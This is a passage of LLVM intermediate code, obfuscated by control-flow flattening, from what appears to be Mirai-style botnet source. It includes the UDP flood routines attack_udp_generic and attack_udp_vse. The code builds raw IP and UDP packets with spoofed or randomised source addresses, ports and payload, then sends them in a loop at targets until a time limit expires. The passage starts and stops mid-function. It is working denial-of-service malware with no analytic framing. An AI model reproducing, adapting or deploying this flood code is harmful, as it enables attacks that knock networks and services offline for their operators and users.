  %624 = load i8*, i8** %42, align 8
  %625 = load i32, i32* %26, align 4
  %626 = sext i32 %625 to i64
  %627 = add i64 40, %626
  %628 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %629 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %630 = load i32, i32* %11, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %629, i64 %631
  %633 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %632, i32 0, i32 0
  %634 = bitcast %struct.sockaddr_in* %633 to %struct.sockaddr*
  store %struct.sockaddr* %634, %struct.sockaddr** %628, align 8
  %635 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %636 = load %struct.sockaddr*, %struct.sockaddr** %635, align 8
  %637 = call i64 @sendto(i32 %623, i8* %624, i64 %627, i32 16384, %struct.sockaddr* %636, i32 16)
  store i32 -1486911469, i32* %switchVar
  br label %loopEnd

; <label>:638:                                    ; preds = %loopEntry
  %639 = load i32, i32* %11, align 4
  %640 = add nsw i32 %639, 1
  store i32 %640, i32* %11, align 4
  store i32 212632030, i32* %switchVar
  br label %loopEnd

; <label>:641:                                    ; preds = %loopEntry
  %642 = call i64 @time(i64* null) #6
  %643 = load i32, i32* %28, align 4
  %644 = sext i32 %643 to i64
  %645 = icmp sgt i64 %642, %644
  %646 = select i1 %645, i32 1018756190, i32 -1065907299
  store i32 %646, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  store i32 2020501901, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  store i32 1591814268, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %648, %647, %641, %638, %566, %559, %555, %549, %531, %525, %524, %523, %520, %519, %518, %515, %509, %508, %507, %506, %503, %494, %485, %359, %355, %263, %254, %245, %232, %227, %218, %217, %205, %197, %193, %188, %183, %174, %153, %137, %136, %132, %131, %125, %124, %121, %115, %114, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  store i32 %77, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1838775833, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1838775833, label %first
    i32 450114230, label %80
    i32 -741870784, label %81
    i32 -1780533543, label %85
    i32 -1210734796, label %86
    i32 61086806, label %92
    i32 1512757355, label %95
    i32 -1951807863, label %96
    i32 1196075775, label %102
    i32 -989010955, label %147
    i32 -816333934, label %151
    i32 -946070884, label %180
    i32 172980385, label %183
    i32 900096182, label %184
    i32 -2010530643, label %185
    i32 963911173, label %191
    i32 1009734951, label %214
    i32 -1111947211, label %235
    i32 1298220473, label %239
    i32 2023687065, label %243
    i32 -48702227, label %248
    i32 1612637409, label %253
    i32 13399952, label %258
    i32 1281576957, label %263
    i32 -855469370, label %268
    i32 321226278, label %273
    i32 -924369785, label %277
    i32 -1906980257, label %285
    i32 773021995, label %332
    i32 -504739591, label %335
    i32 923392265, label %341
    i32 -987681131, label %342
    i32 -1482949094, label %343
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %78 = icmp sgt i32 %.reload, 1460
  %79 = select i1 %78, i32 450114230, i32 -741870784
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i16 1460, i16* %20, align 2
  store i32 -741870784, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %82, i32* %12, align 4
  %83 = icmp eq i32 %82, -1
  %84 = select i1 %83, i32 -1780533543, i32 -1210734796
  store i32 %84, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  store i32 -1482949094, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %87 = load i32, i32* %12, align 4
  %88 = bitcast i32* %11 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #6
  %90 = icmp eq i32 %89, -1
  %91 = select i1 %90, i32 61086806, i32 1512757355
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -1482949094, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1951807863, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  %101 = select i1 %100, i32 1196075775, i32 172980385
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %104 = load i8**, i8*** %13, align 8
  %105 = load i32, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %104, i64 %106
  store i8* %103, i8** %107, align 8
  %108 = load i8**, i8*** %13, align 8
  %109 = load i32, i32* %11, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8*, i8** %108, i64 %110
  %112 = load i8*, i8** %111, align 8
  %113 = bitcast i8* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %24, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %118 = bitcast %struct.iphdr* %117 to i8*
  %119 = load i8, i8* %118, align 4
  %120 = and i8 %119, 15
  %121 = or i8 %120, 64
  store i8 %121, i8* %118, align 4
  %122 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, -16
  %126 = or i8 %125, 5
  store i8 %126, i8* %123, align 4
  %127 = load i8, i8* %14, align 1
  %128 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 1
  store i8 %127, i8* %129, align 1
  %130 = load i16, i16* %20, align 2
  %131 = zext i16 %130 to i64
  %132 = add i64 28, %131
  %133 = trunc i64 %132 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %15, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %16, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %17, align 1
  %145 = icmp ne i8 %144, 0
  %146 = select i1 %145, i32 -989010955, i32 -816333934
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 4
  store i16 %148, i16* %150, align 2
  store i32 -816333934, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 6
  store i8 17, i8* %153, align 1
  %154 = load i32, i32* %22, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 8
  store i32 %154, i32* %156, align 4
  %157 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 9
  store i32 %162, i32* %164, align 4
  %165 = load i16, i16* %18, align 2
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  store i16 %166, i16* %168, align 2
  %169 = load i16, i16* %19, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 1
  store i16 %170, i16* %172, align 2
  %173 = load i16, i16* %20, align 2
  %174 = zext i16 %173 to i64
  %175 = add i64 8, %174
  %176 = trunc i64 %175 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 2
  store i16 %177, i16* %179, align 2
  store i32 -946070884, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = load i32, i32* %11, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %11, align 4
  store i32 -1951807863, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  store i32 900096182, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -2010530643, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32, i32* %11, align 4
  %187 = load i8, i8* %7, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp slt i32 %186, %188
  %190 = select i1 %189, i32 963911173, i32 -504739591
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = load i8**, i8*** %13, align 8
  %193 = load i32, i32* %11, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8*, i8** %192, i64 %194
  %196 = load i8*, i8** %195, align 8
  store i8* %196, i8** %26, align 8
  %197 = load i8*, i8** %26, align 8
  %198 = bitcast i8* %197 to %struct.iphdr*
  store %struct.iphdr* %198, %struct.iphdr** %27, align 8
  %199 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i64 1
  %201 = bitcast %struct.iphdr* %200 to %struct.udphdr*
  store %struct.udphdr* %201, %struct.udphdr** %28, align 8
  %202 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i64 1
  %204 = bitcast %struct.udphdr* %203 to i8*
  store i8* %204, i8** %29, align 8
  %205 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 2
  %210 = load i8, i8* %209, align 4
  %211 = zext i8 %210 to i32
  %212 = icmp slt i32 %211, 32
  %213 = select i1 %212, i32 1009734951, i32 -1111947211
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %216 = load i32, i32* %11, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i32 0, i32 1
  %220 = load i32, i32* %219, align 4
  %221 = call i32 @ntohl(i32 %220) #7
  %222 = call i32 @rand_next()
  %223 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %224 = load i32, i32* %11, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i32 0, i32 2
  %228 = load i8, i8* %227, align 4
  %229 = zext i8 %228 to i32
  %230 = lshr i32 %222, %229
  %231 = add i32 %221, %230
  %232 = call i32 @htonl(i32 %231) #7
  %233 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 9
  store i32 %232, i32* %234, align 4
  store i32 -1111947211, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i32, i32* %22, align 4
  %237 = icmp eq i32 %236, -1
  %238 = select i1 %237, i32 1298220473, i32 2023687065
  store i32 %238, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = call i32 @rand_next()
  %241 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 8
  store i32 %240, i32* %242, align 4
  store i32 2023687065, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i16, i16* %15, align 2
  %245 = zext i16 %244 to i32
  %246 = icmp eq i32 %245, 65535
  %247 = select i1 %246, i32 -48702227, i32 1612637409
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = call i32 @rand_next()
  %250 = trunc i32 %249 to i16
  %251 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 3
  store i16 %250, i16* %252, align 4
  store i32 1612637409, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i16, i16* %18, align 2
  %255 = zext i16 %254 to i32
  %256 = icmp eq i32 %255, 65535
  %257 = select i1 %256, i32 13399952, i32 1281576957
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = call i32 @rand_next()
  %260 = trunc i32 %259 to i16
  %261 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %262 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %261, i32 0, i32 0
  store i16 %260, i16* %262, align 2
  store i32 1281576957, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i16, i16* %19, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp eq i32 %265, 65535
  %267 = select i1 %266, i32 -855469370, i32 321226278
  store i32 %267, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = call i32 @rand_next()
  %270 = trunc i32 %269 to i16
  %271 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %272 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %271, i32 0, i32 1
  store i16 %270, i16* %272, align 2
  store i32 321226278, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i8, i8* %21, align 1
  %275 = icmp ne i8 %274, 0
  %276 = select i1 %275, i32 -924369785, i32 -1906980257
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8*, i8** %29, align 8
  %279 = load i16, i16* %20, align 2
  %280 = zext i16 %279 to i32
  call void @rand_alpha_str(i8* %278, i32 %280)
  %281 = load i8*, i8** %29, align 8
  %282 = load i16, i16* %20, align 2
  %283 = zext i16 %282 to i64
  %284 = getelementptr inbounds i8, i8* %281, i64 %283
  store i8 0, i8* %284, align 1
  store i32 -1906980257, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  %286 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 7
  store i16 0, i16* %287, align 2
  %288 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %289 = bitcast %struct.iphdr* %288 to i16*
  %290 = call zeroext i16 @checksum_generic(i16* %289, i32 20)
  %291 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 7
  store i16 %290, i16* %292, align 2
  %293 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 3
  store i16 0, i16* %294, align 2
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %297 = bitcast %struct.udphdr* %296 to i8*
  %298 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 2
  %300 = load i16, i16* %299, align 2
  %301 = load i16, i16* %20, align 2
  %302 = zext i16 %301 to i64
  %303 = add i64 8, %302
  %304 = trunc i64 %303 to i32
  %305 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %295, i8* %297, i16 zeroext %300, i32 %304)
  %306 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 3
  store i16 %305, i16* %307, align 2
  %308 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %309 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %308, i32 0, i32 1
  %310 = load i16, i16* %309, align 2
  %311 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %312 = load i32, i32* %11, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %315, i32 0, i32 1
  store i16 %310, i16* %316, align 2
  %317 = load i32, i32* %12, align 4
  %318 = load i8*, i8** %26, align 8
  %319 = load i16, i16* %20, align 2
  %320 = zext i16 %319 to i64
  %321 = add i64 28, %320
  %322 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %323 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %324 = load i32, i32* %11, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 0
  %328 = bitcast %struct.sockaddr_in* %327 to %struct.sockaddr*
  store %struct.sockaddr* %328, %struct.sockaddr** %322, align 8
  %329 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %330 = load %struct.sockaddr*, %struct.sockaddr** %329, align 8
  %331 = call i64 @sendto(i32 %317, i8* %318, i64 %321, i32 16384, %struct.sockaddr* %330, i32 16)
  store i32 773021995, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = load i32, i32* %11, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %11, align 4
  store i32 -2010530643, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = call i64 @time(i64* null) #6
  %337 = load i32, i32* %23, align 4
  %338 = sext i32 %337 to i64
  %339 = icmp sgt i64 %336, %338
  %340 = select i1 %339, i32 923392265, i32 -987681131
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  store i32 -1482949094, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 900096182, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %342, %341, %335, %332, %285, %277, %273, %268, %263, %258, %253, %248, %243, %239, %235, %214, %191, %185, %184, %183, %180, %151, %147, %102, %96, %95, %92, %86, %85, %81, %80, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %63 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -1265712771, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
